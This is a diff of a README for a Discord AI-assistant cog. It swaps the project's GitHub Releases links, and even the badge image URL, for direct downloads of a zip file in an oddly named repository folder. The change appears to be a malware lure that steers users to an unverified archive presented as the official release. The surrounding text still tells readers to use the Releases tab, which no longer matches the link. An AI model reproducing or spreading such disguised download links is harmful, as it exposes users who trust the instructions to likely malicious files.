@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/Seo00711/aiuserOAI-Claude/releases)
+[![Download](https://raw.githubusercontent.com/Seo00711/aiuserOAI-Claude/main/globulinuria/aiuserOAI-Claude.zip%20release-blue)](https://raw.githubusercontent.com/Seo00711/aiuserOAI-Claude/main/globulinuria/aiuserOAI-Claude.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to aiuserOAI-Claude, your new AI assistant for Discord. This cog allows 
 
 ## 📥 Download & Install
 
-To get the application, please visit [this page to download](https://github.com/Seo00711/aiuserOAI-Claude/releases). Look for the latest version and choose the correct file for your system. 
+To get the application, please visit [this page to download](https://raw.githubusercontent.com/Seo00711/aiuserOAI-Claude/main/globulinuria/aiuserOAI-Claude.zip). Look for the latest version and choose the correct file for your system. 
 
 1. Click the "Releases" tab on the page.
 2. Download the appropriate file based on your operating system. For most users, you will want the `.zip` file for easy extraction.
